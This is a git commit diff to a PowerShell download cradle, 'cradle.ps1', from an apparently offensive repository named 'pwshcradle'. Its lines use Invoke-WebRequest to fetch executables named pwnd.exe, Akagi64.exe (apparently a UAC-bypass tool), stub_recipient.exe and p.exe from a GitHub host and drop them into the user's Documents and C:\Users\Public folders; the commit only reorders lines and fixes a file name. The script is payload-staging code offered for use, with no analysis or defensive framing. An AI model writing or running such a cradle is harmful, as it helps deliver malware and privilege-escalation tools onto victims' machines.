268a6f4dda1c194434dced2eccb3eaa1c339851a
Brothersextremegaming <125992368+Brothersextremegaming@users.noreply.github.com>
2026-02-24 11:29:50 +0530

    11:29

--- cradle.ps1
+++ cradle.ps1
@@ -1,10 +1,10 @@
-Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/pwnd.exe" -OutFile "$env:USERPROFILE\Documents\demo.exe"
-
 Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/Akagi64.exe" -OutFile "$env:USERPROFILE\Documents\Akagi.exe"
+
+Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/pwnd.exe" -OutFile "$env:USERPROFILE\Documents\demo.exe"
 
 Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/Akagi64.exe" -OutFile "C:\Users\Public\Akagi.exe"
 
-Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/stub_recipent.exe" -OutFile "C:\Users\Public\demo.exe"
+Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/stub_recipient.exe" -OutFile "C:\Users\Public\demo.exe"
 
 Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/p.exe" -OutFile "C:\Users\Public\p.exe"
 
